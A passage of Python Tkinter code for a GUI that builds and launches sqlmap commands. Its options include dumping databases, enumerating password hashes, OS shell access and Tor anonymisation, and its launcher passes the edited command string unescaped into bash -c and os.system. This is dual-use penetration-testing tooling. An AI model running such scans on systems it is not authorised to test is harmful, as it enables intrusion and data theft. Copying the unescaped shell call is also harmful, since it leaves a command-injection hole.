            return f' --second-req="{self.e_second_req_value.get()}"'

        self.entry_second_req.config(state="disabled")
        return ""

    # --nosql: NoSQL injection
    @property
    def f_nosql(self):
        if self.chk_nosql_var.get() == "on":
            return " --nosql"
        return ""

    # --graphql: GraphQL injection
    @property
    def f_graphql(self):
        if self.chk_graphql_var.get() == "on":
            return " --graphql"
        return ""

    # --ldap: LDAP injection
    @property
    def f_ldap(self):
        if self.chk_ldap_var.get() == "on":
            return " --ldap"
        return ""

    # --xpath: XPath injection
    @property
    def f_xpath(self):
        if self.chk_xpath_var.get() == "on":
            return " --xpath"
        return ""

    # --ssti: server-side template injection
    @property
    def f_ssti(self):
        if self.chk_ssti_var.get()  == "on":
            return " --ssti"
        return ""

    # --xslt: XSLT injection
    @property
    def f_xslt(self):
        if self.chk_xslt_var.get() == "on":
            return " --xslt"
        return ""

    # --xxe: XML External Entity (XXE) injection
    @property
    def f_xxe(self):
        if self.chk_xxe_var.get() == "on":
            return " --xxe"
        return ""

    # --hql: HQL/JPQL (Hibernate ORM) injection
    @property
    def f_hql(self):
        if self.chk_hql_var.get() == "on":
            return " --hql"
        return ""

    # --sparql: SPARQL injection
    @property
    def f_sparql(self):
        if self.chk_sparql_var.get() == "on":
            return " --sparql"
        return ""

    # --odata: OData $filter injection
    @property
    def f_odata(self):
        if self.chk_odata_var.get() == "on":
            return " --odata"
        return ""

    # --jwt: Audit JSON Web Tokens (JWT) for weaknesses
    @property
    def f_jwt(self):
        if self.chk_jwt_var.get() == "on":
            return " --jwt"
        return ""

    # --oob-server=OOB..  Out-of-band server for blind '--xxe'
    @property
    def f_oob_server(self):
        if self.chk_oob_server_var.get() == "on":
            return f' --oob-server="{self.e_oob_server.get()}"'
        return ""

    # --oob-token=OOBT..  Authentication token for a self-hosted '--oob-server'
    @property
    def f_oob_token(self):
        if self.chk_oob_token_var.get() == "on":
            return f' --oob-token="{self.e_oob_token.get()}"'
        return ""

    # --tamper=TAMPER Use given script(s) for tampering injection data
    def f_tamper(self):
        sel = self.tamper.curselection()
        if sel:
            return f' --tamper="{",".join(self.tamper.get(i) for i in sel)}"'
        return ""

    # --current-user      Retrieve DBMS current user
    @property
    def f_current_user(self):
        if self.chk_current_user_var.get() == "on":
            return " --current-user"
        return ""

    # --current-db        Retrieve DBMS current database
    @property
    def f_current_db(self):
        if self.chk_current_db_var.get() == "on":
            return " --current-db"
        return ""

    # -a, --all           Retrieve everything
    @property
    def f_all(self):
        if self.chk_all_var.get() == "on":
            return " --all"
        return ""

    # --is-dba            Detect if the DBMS current user is DBA
    @property
    def f_is_dba(self):
        if self.chk_is_dba_var.get() == "on":
            return " --is-dba"
        return ""

    # --users             Enumerate DBMS users
    @property
    def f_users(self):
        if self.chk_users_var.get() == "on":
            return " --users"
        return ""

    # --passwords         Enumerate DBMS users password hashes
    @property
    def f_passwords(self):
        if self.chk_passwords_var.get() == "on":
            return " --passwords"
        return ""

    # --privileges        Enumerate DBMS users privileges
    @property
    def f_privileges(self):
        if self.chk_privileges_var.get() == "on":
            return " --privileges"
        return ""

    # --comments          Retrieve DBMS comments
    @property
    def f_comments(self):
        if self.chk_comments_var.get() == "on":
            return " --comments"
        return ""

    # --roles             Enumerate DBMS users roles
    @property
    def f_roles(self):
        if self.chk_roles_var.get() == "on":
            return " --roles"
        return ""

    # --common-tables     Check existence of common tables
    @property
    def f_common_tables(self):
        if self.chk_common_tables_var.get() == "on":
            return " --common-tables"
        return ""

    # --common-columns     Check existence of common columns
    @property
    def f_common_columns(self):
        if self.chk_common_columns_var.get() == "on":
            return " --common-columns"
        return ""

    # --common-files      Check existence of common files
    @property
    def f_common_files(self):
        if self.chk_common_files_var.get() == "on":
            return " --common-files"
        return ""

    # --udf-inject     Inject custom user-defined functions
    @property
    def f_udf_inject(self):
        if self.chk_udf_inject_var.get() == "on":
            return " --udf-inject"
        return ""

    # --shared-lib     Local path of the shared library
    @property
    def f_shared_lib(self):
        if self.chk_shared_lib_var.get() == "on":
            return f' --shared-lib="{self.e_shared_lib.get()}"'
        return ""

    # --dbs               Enumerate DBMS databases
    @property
    def f_dbs(self):
        if self.chk_dbs_var.get() == "on":
            return " --dbs"
        return ""

    # --tables            Enumerate DBMS database tables
    @property
    def f_tables(self):
        if self.chk_tables_var.get() == "on":
            return " --tables"
        return ""

    # --columns           Enumerate DBMS database table columns
    @property
    def f_columns(self):
        if self.chk_columns_var.get() == "on":
            return " --columns"
        return ""

    # --hostname          Retrieve DBMS server hostname
    @property
    def f_host_name(self):
        if self.chk_host_name_var.get() == "on":
            return " --hostname"
        return ""

    # --schema            Enumerate DBMS schema
    @property
    def f_schema(self):
        if self.chk_schema_var.get() == "on":
            return " --schema"
        return ""

    # --count             Retrieve number of entries for table(s)
    @property
    def f_count(self):
        if self.chk_count_var.get() == "on":
            return " --count"
        return ""

    # --force-dns
    @property
    def f_force_dns(self):
        if self.chk_force_dns_var.get() == "on":
            return " --force-dns"
        return ""

    # --force-pivoting
    @property
    def f_force_pivoting(self):
        if self.chk_force_pivoting_var.get() == "on":
            return " --force-pivoting"
        return ""

    # --smoke-test
    @property
    def f_smoke_test(self):
        if self.chk_smoke_test_var.get() == "on":
            return " --smoke-test"
        return ""


    # --vuln-test
    @property
    def f_vuln_test(self):
        if self.chk_vuln_test_var.get() == "on":
            return " --vuln-test"
        return ""



    # --unstable    If the target is unstable
    @property
    def f_unstable(self):
        if self.chk_unstable_var.get() == "on":
            return " --unstable"
        return ""

    # --results-file    Location of CSV results file in multiple targets mode
    @property
    def f_result_file(self):
        if self.chk_result_file_var.get() == "on":
            return " --results-file"
        return ""

    # --no-truncate       Disable console output truncation (e.g. long entr...)
    @property
    def f_no_truncate(self):
        if self.chk_no_truncate_var.get() == "on":
            return " --no-truncate"
        return ""

    # --dump              Dump DBMS database table entries
    @property
    def f_dump(self):
        if self.chk_dump_var.get() == "on":
            return " --dump"
        return ""

    # --search            Search column(s), table(s) and/or database name(s)
    @property
    def f_search(self):
        if self.chk_search_var.get() == "on":
            return " --search"
        return ""

    # --dump-all          Dump all DBMS databases tables entries
    @property
    def f_dump_all(self):
        if self.chk_dump_all_var.get() == "on":
            return " --dump-all"
        return ""

    # --statements        Retrieve SQL statements being run on DBMS
    @property
    def f_statements(self):
        if self.chk_statements_var.get() == "on":
            return " --statements"
        return ""

    # --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    @property
    def f_exclude_sys_dbs(self):
        if self.chk_exclude_sys_dbs_var.get() == "on":
            return " --exclude-sysdbs"
        return ""

    # -D DB    DBMS database to enumerate
    @property
    def f_database_enumerate(self):
        if self.chk_database_enumerate_var.get() == "on":
            return f' -D "{self.e_database_enumerate.get()}"'
        return ""

    # -T TBL              DBMS database table(s) to enumerate
    @property
    def f_table(self):
        if self.chk_table_var.get() == "on":
            return f' -T "{self.e_table.get()}"'
        return ""

    # -C COL              DBMS database table column(s) to enumerate
    @property
    def f_column(self):
        if self.chk_column_var.get() == "on":
            return f' -C "{self.e_column.get()}"'
        return ""

    # -U USER             DBMS user to enumerate
    @property
    def f_user(self):
        if self.chk_user_var.get() == "on":
            return f' -U "{self.e_user.get()}"'
        return ""

    # --exclude=EXCLUDE   DBMS database identifier(s) to not enumerate
    def f_exclude(self, *args):
        if self.chk_exclude_var.get() == "on":
            self.e_exclude.config(state="normal")
            return f' --exclude="{self.e_exclude_value.get()}"'

        self.e_exclude.config(state="disabled")
        return ""

    # --where=DUMPWHERE   Use WHERE condition while table dumping
    def f_where_dump(self, *args):
        if self.chk_where_dump_var.get() == "on":
            self.e_where_dump.config(state="normal")
            return f' --where="{self.e_where_dump.get()}"'

        self.e_where_dump.config(state="disabled")
        return ""

    # --start=LIMITSTART  First query output entry to retrieve
    # --stop=LIMITSTOP    Last query output entry to retrieve
    @property
    def f_start_stop(self):
        if self.chk_start_var.get() == "on":
            start, stop = (self.e_start.get().split(",", 1) + [""])[:2]
            return f' --start="{start}" --stop="{stop}"'
        return ""

    # --sql-shell         Prompt for an interactive SQL shell
    @property
    def f_sql_shell(self):
        if self.chk_sql_shell_var.get() == "on":
            return " --sql-shell"
        return ""

    # --sql-file=SQLFILE  Execute SQL statements from given file(s)
    def f_sql_file(self):
        if self.chk_sql_file_var.get() == "on":
            filename = tkinter.filedialog.askopenfile(mode="r")
            if filename:
                self.var_sql_file.set(filename.name)
        else:
            self.var_sql_file.set("")

    # --sql-file=SQLFILE  Execute SQL statements from given file(s)
    @property
    def f_sql_file_read(self):
        value = self.var_sql_file.get()
        if value:
            return f' --sql-file="{value}"'
        return ""



    # --first=FIRSTCHAR   First query output word character to retrieve
    @property
    def f_first(self):
        if self.chk_first_var.get() == "on":
            return f' --first="{self.entry_first.get()}"'
        return ""

    # --last=LASTCHAR     Last query output word character to retrieve
    @property
    def f_last(self):
        if self.chk_last_var.get() == "on":
            return f' --last="{self.entry_last.get()}"'
        return ""

    # --check-tor         Check to see if Tor is used properly
    @property
    def f_tor(self):
        if self.chk_tor_var.get() == "on":
            return " --check-tor"
        return ""

    # --tor               Use Tor anonymity network
    @property
    def f_tor_use(self):
        if self.chk_tor_use_var.get() == "on":
            return " --tor"
        return ""

    # --dump-format=DUMPFORMAT  Format of dumped data (CSV (default), HTML or SQLITE)
    def f_dump_format(self, *args):
        if self.chk_dump_format_var.get() == "on":
            self.e_dump_format.config(state="readonly")
            return f' --dump-format="{self.e_dump_format_value.get()}"'

        self.e_dump_format.config(state="disabled")
        return ""

    # --encoding=GBK  Character encoding used for data retrieval (e.g. GBK)
    def f_encoding(self, *args):
        if self.chk_encoding_var.get() == "on":
            self.encoding.config(state="normal")
            return f' --encoding="{self.encoding_value.get()}"'

        self.encoding.config(state="disabled")
        return ""

    # --tor-port=TORPORT  Set Tor proxy port other than default
    def f_tor_port(self, *args):
        if self.chk_tor_port_var.get() == "on":
            self.e_tor_port.config(state="readonly")
            return f' --tor-port="{self.e_tor_port.get()}"'

        self.e_tor_port.config(state="disabled")
        return ""

    # --tor-type=TORTYPE  Set Tor proxy type (HTTP - default, SOCKS4 or SOCKS5)
    def f_tor_type(self, *args):
        if self.chk_tor_type_var.get() == "on":
            self.e_tor_type.config(state="readonly")
            return f' --tor-type="{self.e_tor_type.get()}"'

        self.e_tor_type.config(state="disabled")
        return ""

    # --pivot-column=P..  Pivot column name
    @property
    def f_pivot(self):
        if self.chk_pivot_var.get() == "on":
            return f' --pivot-column="{self.e_pivot.get()}"'
        return ""

    # --procs
    @property
    def f_procs(self):
        if self.chk_procs_var.get() == "on":
            return " --procs"
        return ""

    # --eta               Display for each output the estimated time of arrival
    @property
    def f_eta(self):
        if self.chk_eta_var.get() == "on":
            return " --eta"
        return ""

    # --forms             Parse and test forms on target URL
    @property
    def f_forms(self):
        if self.chk_forms_var.get() == "on":
            return " --forms"
        return ""

    # --fresh-queries     Ignore query results stored in session file
    @property
    def f_fresh(self):
        if self.chk_fresh_var.get() == "on":
            return " --fresh-queries"
        return ""

    # --parse-errors      Parse and display DBMS error messages from responses
    @property
    def f_parse_errors(self):
        if self.chk_parse_errors_var.get() == "on":
            return " --parse-errors"
        return ""

    # --repair    Redump entries having unknown character marker (?)
    @property
    def f_repair(self):
        if self.chk_repair_var.get() == "on":
            return " --repair"
        return ""

    # --flush-session     Flush session files for current target
    @property
    def f_flush(self):
        if self.chk_flush_var.get() == "on":
            return " --flush-session"
        return ""

    # --charset=CHARSET   Force character encoding used for data retrieval
    def f_charset(self, *args):
        if self.chk_charset_var.get() == "on":
            self.e_charset.config(state="normal")
            return f' --charset="{self.e_charset.get()}"'

        self.e_charset.config(state="disabled")
        return ""

    # --check-internet    Check Internet connection before assesing the target
    @property
    def f_check_connect(self):
        if self.chk_internet_connect_var.get() == "on":
            return " --check-internet"
        return ""

    # --crawl=CRAWLDEPTH  Crawl the website starting from the target url
    def f_crawl(self, *args):
        if self.chkCrawl_var.get() == "on":
            self.e_crawl.config(state="normal")
            return f' --crawl="{self.e_crawl.get()}"'

        self.e_crawl.config(state="disabled")
        return ""

    # --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
    def f_crawl_exclude(self, *args):
        if self.chk_crawl_exclude_var.get() == "on":
            self.e_crawl_exclude.config(state="normal")
            return f' --crawl-exclude="{self.e_crawl_exclude.get()}"'

        self.e_crawl_exclude.config(state="disabled")
        return ""

    # --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
    def f_csv_del(self, *args):
        if self.chk_csv_del_var.get() == "on":
            self.e_csv_del.config(state="normal")
            return f' --csv-del="{self.e_csv_del.get()}"'

        self.e_csv_del.config(state="disabled")
        return ""

    # --table-prefix=T..  Prefix used for temporary tables (default: "sqlmap")
    def f_table_prefix(self, *args):
        if self.chk_table_prefix_var.get() == "on":
            self.e_table_prefix.config(state="normal")
            return f' --table-prefix="{self.e_table_prefix.get()}"'

        self.e_table_prefix.config(state="disabled")
        return ""

    # --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
    def f_test_filter(self, *args):
        if self.chk_test_filter_var.get() == "on":
            self.e_test_filter.config(state="normal")
            return f' --test-filter="{self.e_test_filter_value.get()}"'

        self.e_test_filter.config(state="disabled")
        return ""

    # --preprocess    Use given script(s) for preprocessing of response data
    def f_pre_process(self):
        if self.chk_preprocess_var.get() == "on":
            filename = tkinter.filedialog.askopenfile(mode="r")
            if filename:
                self.e_preprocess_var.set(filename.name)
        else:
            self.e_preprocess_var.set("")

    # --preprocess    Use given script(s) for preprocessing of response data
    @property
    def pre_process_script(self):
        value = self.e_preprocess_var.get()
        if value:
            return f' --preprocess="{value}"'
        return ""

    # --postprocess    Use given script(s) for postprocessing of response data
    def f_post_process(self):
        if self.chk_post_process_var.get() == "on":
            filename = tkinter.filedialog.askopenfile(mode="r")
            if filename:
                self.e_post_process_var.set(filename.name)
        else:
            self.e_post_process_var.set("")

    # --postprocess    Use given script(s) for postprocessing of response data
    @property
    def post_process_script(self):
        value = self.e_post_process_var.get()
        if value:
            return f' --postprocess="{value}"'
        return ""

    # --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
    def f_test_skip(self, *args):
        if self.chk_test_skip_var.get() == "on":
            self.e_test_skip.config(state="normal")
            return f' --test-skip="{self.e_test_skip_value.get()}"'

        self.e_test_skip.config(state="disabled")
        return ""

    # --user-agent=AGENT  HTTP User-Agent header
    def f_user_agent(self, *args):
        if self.chk_user_agent_var.get() == "on":
            self.e_user_agent.config(state="normal")
            return f' --user-agent="{self.e_ua_value.get()}"'

        self.e_user_agent.config(state="disabled")
        return ""

    # --proxy=PROXY     Use a HTTP proxy to connect to the target URL
    def f_proxy(self, *args):
        if self.chk_proxy_var.get() == "on":
            self.e_proxy.config(state="normal")
            return f' --proxy="{self.e_proxy_value.get()}"'

        self.e_proxy.config(state="disabled")
        return ""

    # --output-dir=OUT..  Custom output directory path
    def f_output_dir(self):
        if self.chk_output_dir_var.get() == "on":
            dir_name = tkinter.filedialog.askdirectory()
            if dir_name:
                self.e_output_dir_var.set(dir_name)
        else:
            self.e_output_dir_var.set("")

    # --output-dir=OUT..  Custom output directory path
    @property
    def set_out_dir(self):
        value = self.e_output_dir_var.get()
        if value:
            return f' --output-dir="{value}"'
        return ""

    # -r REQUESTFILE      Load HTTP request from a file
    def read_host(self) -> str:
        """Return a text host for output paths, never bytes or None."""
        target_value: str = self.urlentry.get()
        if self.varTarget.get() == "requestFile":
            with open(target_value, encoding="utf-8", errors="replace") as file:
                for line in file:
                    name, separator, value = line.partition(":")
                    if separator and name.strip().lower() == "host":
                        return value.strip() or "Invalid requestFile :("
            return "Invalid requestFile :("

        parsed: urllib.parse.ParseResult = urllib.parse.urlparse(target_value)
        return parsed.netloc

    # log viewer
    def sqlmap(self, *args):
        load_host = self.read_host()
        text = open(r"./output/" + load_host + "/log", 'r').readlines()
        pattern = re.compile(
            r'(?m)(^sqlmap(.*)|^---$|^Place:(.*)|^Parameter:(.*)|\s{4,}Type:(.*)|\s{4,}Title:(.*)|\s{4,}Payload:(.*)|\s{4,}Vector:(.*))$',
            re.DOTALL)
        mode = os.O_CREAT | os.O_TRUNC
        f = os.open(r"./output/" + load_host + "/gui_log", mode)
        os.close(f)
        for x in text:
            qq = pattern.sub('', x).strip("\n")
            if len(qq) > 4:
                mode = os.O_WRONLY | os.O_APPEND
                f = os.open(r"./output/" + load_host + "/gui_log", mode)
                os.write(f, qq.encode('utf-8') + b'\n')  # encode string to bytes before writing
                os.close(f)

    # load log without query
    # self.chkLog_var with query
    def logs(self, *args):
        logfile = "log" if self.chkLog_var.get() == "on" else "gui_log"
        load_host = self.read_host()
        self.sesTXT.delete("1.0", tkinter.END)

        keywords = [
            'available databases', 'Database:', 'Table:', '[*]',
            'database management system users:', 'current user:',
            'database management system users', 'password hashes:',
            'password hash:', 'found databases', 'file saved to:',
        ]

        try:
            log_path = f"./output/{load_host}/{logfile}"
            log_size = os.path.getsize(log_path)
            if log_size != 0:
                self.sqlmap()
                with open(log_path, "r", encoding="utf-8", errors="replace") as fh:
                    self.sesTXT.insert(tkinter.END, fh.read())

                self.sesTXT.mark_set(tkinter.INSERT, "1.0")
                self.sesTXT.tag_config('found', font=('arial', 8, 'bold'))

                for tagz in keywords:
                    idx = "1.0"
                    while True:
                        idx = self.sesTXT.search(tagz, idx, nocase=True, stopindex=tkinter.END)
                        if not idx:
                            break
                        last_idx = f"{idx}+{len(tagz)}c"
                        self.sesTXT.tag_add('found', idx, last_idx)
                        idx = last_idx
                self.sesTXT.focus_set()
            else:
                self.sesTXT.insert(tkinter.END, f"Log-Empty {load_host}.")
        except (IOError, OSError):
            self.sesTXT.insert(tkinter.END, f"Log-Not-Found {load_host}.")

    # Show current session
    def session(self):
        load_host = self.read_host()
        self.sesTXT.delete("1.0", tkinter.END)
        try:
            session_size = os.path.getsize("./output/" + load_host + "/session")
            if session_size != 0:
                self.sesTXT.insert(tkinter.END, open(r"./output/" + load_host + "/session", 'r').read())
                self.sesTXT.mark_set(tkinter.INSERT, '1.0')
                self.sesTXT.focus()
            else:
                self.sesTXT.insert(tkinter.END, u"Session-File-Empty " + load_host + ".")
        except (IOError, OSError):
            self.sesTXT.insert(tkinter.END, u"Session-File-Not-Found " + load_host + ".")
        return

    # Target: At least one of these options has to be provided to define the target(s)
    def commands(self, *args):
        inject = ""
        target = ""
        selection = self.varTarget.get()
        tag = self.urlentry.get()
        if selection == "url":
            target = ' --url="%s"' % tag
        elif selection == "logFile":
            target = ' -l "%s"' % tag
        elif selection == "bulkFile":
            target = ' -m "%s"' % tag
        elif "requestFile" == selection:
            target = ' -r "%s"' % tag
        elif selection == "googleDork":
            target = ' -g "%s"' % tag
        elif selection == "direct":
            target = ' -d "%s"' % tag
        elif selection == "configFile":
            target = ' -c "%s"' % tag
        elif selection == "openapi":
            target = self._openapi_argument("openapi", tag.strip())
        # Focused options
        try:
            inject = (target + self.f_openapi_options + self.f_extra_options + self.f_tamper() +
                      self.f_data + self.f_method() + self.f_read_file_write + self.f_file_dest +
                      self.f_read_msf_path + self.f_os_cmd + self.f_os_shell + self.f_os_pwn + self.f_os_smbrelay +
                      self.f_os_bof + self.f_priv_esc + self.f_tmp_path + self.f_file_read + self.set_out_dir +
                      self.f_reg_read + self.f_reg_add + self.f_reg_del + self.f_reg_key + self.f_reg_value +
                      self.f_reg_data + self.f_reg_type + self.f_api + self.f_task_id + self.f_database +
                      self.f_sql_query() + self.f_param_del + self.f_random_agent + self.f_proxy() +
                      self.f_proxy_cred() + self.f_ignore_proxy + self.f_ignore_redirects + self.f_ignore_timeouts +
                      self.f_read_proxy_file + self.f_proxy_freq() + self.f_hpp + self.f_cookie_del + self.f_level() +
                      self.f_risk() + self.f_titles + self.f_hex + self.f_text_only + self.f_code() + self.f_lengths +
                      self.f_smart + self.f_regexp() + self.f_string() + self.f_not_string() + self.f_time_sec() +
                      self.f_technique() + self.f_dns_domain() + self.f_second_url() + self.f_second_req() +
                      self.f_nosql + self.f_graphql + self.f_ldap + self.f_xpath + self.f_ssti + self.f_xslt +
                      self.f_xxe + self.f_hql + self.f_sparql + self.f_odata + self.f_jwt + self.f_oob_server +
                      self.f_oob_token + self.f_optimization  +
                      self.f_no_keep_alive + self.f_null_connection + self.f_threads() + self.f_dbms() +
                      self.f_union_cols() + self.f_union_char() + self.f_union_from() + self.f_union_values() +
                      self.f_cookie() + self.read_live_cookies + self.read_load_cookies + self.f_drop_set_cookie +
                      self.f_http1 + self.f_http2 + self.f_prefix() + self.f_suffix() + self.f_user_agent() +
                      self.f_randomize() + self.f_force_ssl + self.f_host() + self.f_referer() + self.f_headers() +
                      self.read_load_headers + self.read_auth_file + self.f_auth_cred() + self.f_auth_type() +
                      self.f_delay() + self.f_time_out() + self.f_retries() + self.f_safe_url() +
                      self.f_skip_urlencode + self.f_eval_code() + self.f_chunked + self.f_header() +
                      self.f_ignore() + self.f_safe_post + self.f_safe_req + self.f_safe_freq + self.f_csrf_token() +
                      self.f_csrf_retries() + self.f_csrf_method() + self.f_csrf_data() + self.f_csrf_url +
                      self.f_os() + self.f_skip  + self.f_invalid_bignum +
                      self.f_invalid_logical + self.f_no_cast + self.f_batch + self.f_no_logging +
                      self.f_save_dump_file + self.f_no_escape + self.f_invalid_string + self.f_proof +
                      self.f_esperanto + self.f_current_user + self.f_current_db + self.f_all + self.f_is_dba +
                      self.f_users + self.f_passwords + self.f_dbms_cred() + self.f_privileges + self.f_roles +
                      self.f_dbs + self.f_common_tables + self.f_common_columns + self.f_udf_inject +
                      self.f_common_files + self.f_tables + self.f_columns + self.f_schema + self.f_count +
                      self.f_force_dns + self.f_force_pivoting + self.f_smoke_test + self.f_dump + self.f_dump_all +
                      self.f_statements + self.f_search + self.f_database_enumerate + self.f_table + self.f_column +
                      self.f_user + self.f_exclude() + self.f_where_dump() + self.f_exclude_sys_dbs + self.f_host_name +
                      self.f_comments + self.f_start_stop + self.f_first + self.f_last + self.f_verbose() +
                      self.f_sql_shell   + self.f_tmp_dir() +
                      self.f_web_root() + self.f_disable_precon() + self.f_sql_file_read + self.f_abort_on_empty() +
                      self.f_shared_lib + self.f_wizard + self.f_dummy + self.f_debug + self.f_disable_stats +
                      self.f_profile + self.f_force_dbms  + self.f_dump_format() + self.f_encoding() +
                      self.f_vuln_test   + self.f_unstable + self.f_result_file +
                      self.f_no_truncate + self.f_z + self.f_alert + self.f_disable_coloring + self.f_last +
                      self.f_answers() + self.f_finger_print + self.f_banner + self.f_tor + self.f_tor_use +
                      self.f_tor_port() + self.f_tor_type() + self.f_pivot + self.f_procs + self.f_eta + self.f_forms +
                      self.f_fresh + self.f_parse_errors + self.f_repair + self.f_flush + self.f_charset() +
                      self.f_check_connect + self.f_binary_fields() + self.f_crawl() + self.f_csv_del() +
                      self.f_table_prefix() + self.f_test_filter() + self.f_test_skip() +self.f_crawl_exclude() +
                      self.f_save_traffic_file + self.f_read_session_file + self.save_config + self.f_scope +
                      self.save_har_file + self.save_report_json_file + self.f_beep + self.pre_process_script +
                      self.post_process_script + self.f_skip_static + self.f_cleanup  +
                      self.f_skip_heuristics + self.f_skip_waf + self.f_offline + self.f_timeless +
                      self.f_sqlmap_shell + self.f_dependencies + self.f_gpage + self.f_mobile  +
                      self.f_read_crack + self.f_base64 + self.f_base64safe + self.f_purge + self.f_time_limit() +
                      self.f_disable_hashing + self.f_unsafe_naming + self.f_test_parameter() + self.f_param_exclude())

        except:
            inject = "select the url checkbox parameter to build the command"
        finally:
            self.sql_var.set(inject)

    # Start configured query for sqlmap.py
    def inject_it(self):
        if os.name == "posix":
            subprocess.Popen([
                "gnome-terminal", "--", "/bin/bash", "-c",
                "python3 sqlmap.py %s; exec bash" % self.sqlEdit.get(),
            ])
        else:
            os.system('start cmd /k python sqlmap.py %s' % self.sqlEdit.get())

    def on_find(self, event=None):
        search_target = self.searchEdit.get()
        if search_target:
            where = self.sesTXT.search(search_target, tkinter.INSERT, tkinter.END)
            if where:
                past_it = where + ('+%dc' % len(search_target))
                self.sesTXT.tag_remove('foo', '1.0', tkinter.END)
                self.sesTXT.tag_add('foo', where, past_it)
                self.sesTXT.tag_config('foo', foreground='yellow', font=('arial', 8, 'bold'))
                self.sesTXT.mark_set(tkinter.INSERT, past_it)
                self.sesTXT.see(tkinter.INSERT)
                self.sesTXT.focus()
            else:
                self.sesTXT.mark_set(tkinter.INSERT, '1.0')
                self.sesTXT.tag_remove('foo', '1.0', tkinter.END)
                self.sesTXT.tag_config('foo', foreground='yellow')
                self.sesTXT.focus()

    def on_find_all(self, event=None):
        find_target = self.searchEdit.get()
        self.sesTXT.mark_set(tkinter.INSERT, '1.0')
        self.sesTXT.tag_remove('foo', '1.0', tkinter.END)  # remove selection
        self.sesTXT.focus()
        if find_target:
            while 1:
                where = self.sesTXT.search(find_target, tkinter.INSERT, tkinter.END)

                if where:
                    past_it = where + ('+%dc' % len(find_target))
                    self.sesTXT.tag_add('foo', where, past_it)
                    self.sesTXT.tag_config('foo', foreground='yellow', font=('arial', 8, 'bold'))
                    self.sesTXT.mark_set(tkinter.INSERT, past_it)
                    self.sesTXT.see(tkinter.INSERT)
                    self.sesTXT.focus()
                else:
                    break

    # Hotkey Alt + 1 2 3 4 5
    def alt_key_1(self, event=None):
        self.noBF.select(self.noBF.tabs()[0])
        return "break"

    def alt_key_2(self, *args):
        self.noBF.select(self.noBF.tabs()[1])

    def alt_key_3(self, *args):
        self.noBF.select(self.noBF.tabs()[2])

    def alt_key_4(self, *args):
        self.noBF.select(self.noBF.tabs()[3])

    def alt_key_5(self, *args):
        self.noBF.select(self.noBF.tabs()[4])

    # s l e h
    def alt_key_s(self, *args):
        self.nRoot.select(self.nRoot.tabs()[0])

    def alt_key_l(self, *args):
        self.nRoot.select(self.nRoot.tabs()[1])

    def alt_key_e(self, *args):
        self.nRoot.select(self.nRoot.tabs()[2])

    def help__f1(self, *args):
        self.nRoot.select(self.nRoot.tabs()[3])

# -----------------------------------------
def fit_window_to_screen(window):
    """Keep a compact, stable width and fit the height to the display."""
    window.update_idletasks()

    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()

    # Leave room for the desktop panels and window decorations.
    maximum_width = max(1, int(screen_width * 0.90))
    maximum_height = max(1, int(screen_height * 0.88))

    # Do not force the window wider than its content or the compact width cap.
    window_width = min(window.winfo_reqwidth(), 880, maximum_width)
    window_height = min(820, maximum_height)
    position_x = max(0, (screen_width - window_width) // 2)
    position_y = max(0, (screen_height - window_height) // 2)

    window.geometry(
        f"{window_width}x{window_height}+{position_x}+{position_y}"
    )


# -----------------------------------------
def main():
    root = tkinter.Tk()
    # Avoid displaying an incorrectly sized intermediate window while the
    # large interface is being constructed.
    root.withdraw()
    # f = font.Font(family='Helvetica', size=8, weight='bold')
    # font.families()
    # s = tkinter.ttk.Style()
    # s.theme_use('clam')
    # s.configure('.', font=f)
    # Keep native light/dark appearance and use regular text for dense forms.
    default_font = font.nametofont('TkDefaultFont')
    default_font.configure(size=10, weight='normal')
    style = ttk.Style(root)
    style.configure('.', font=default_font)
    style.configure('TNotebook', padding=3)
    style.configure('TNotebook.Tab', padding=(7, 4), font=default_font)
    style.configure('TButton', padding=(8, 2))
    # Use a theme-independent border so the primary action stays blue on macOS.
    style.element_create('PrimaryButton.border', 'from', 'clam', 'Button.border')
    # Reuse ttk's existing layout without constructing nested dictionaries.
    current_theme = style.theme_use()
    try:
        style.theme_use('clam')
        primary_layout = style.layout('TButton')
    finally:
        style.theme_use(current_theme)
    if primary_layout:
        _, border_options = primary_layout[0]
        primary_layout[0] = ('PrimaryButton.border', border_options)
    style.layout('Primary.TButton', primary_layout)
    style.configure('Primary.TButton', background='#2563eb', foreground='white',
                    bordercolor='#2563eb', lightcolor='#2563eb', darkcolor='#2563eb',
                    padding=(12, 5), font=(default_font.actual('family'), 10, 'bold'))
    style.map('Primary.TButton',
              background=[('pressed', '#1e40af'), ('active', '#1d4ed8')],
              bordercolor=[('pressed', '#1e40af'), ('active', '#1d4ed8')],
              lightcolor=[('pressed', '#1e40af'), ('active', '#1d4ed8')],
              darkcolor=[('pressed', '#1e40af'), ('active', '#1d4ed8')],
              foreground=[('disabled', '#cbd5e1'), ('!disabled', 'white')])

    style.configure('TEntry', padding=2)
    style.configure('TCombobox', padding=2)
    style.configure('TLabelframe', padding=4)
    style.configure('Section.TLabel', font=(default_font.actual('family'), 11, 'bold'))
    style.configure('Hint.TLabel', font=(default_font.actual('family'), 9))
    root.title("SQLmap Command Builder")
    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)
    # The dense two-column form has a stable width; height remains adjustable.
    root.resizable(False, True)
    MainApplication(mw=root)
    fit_window_to_screen(root)
    root.deiconify()
    root.mainloop()


# -----------------------------------------
if __name__ == '__main__':
    main()
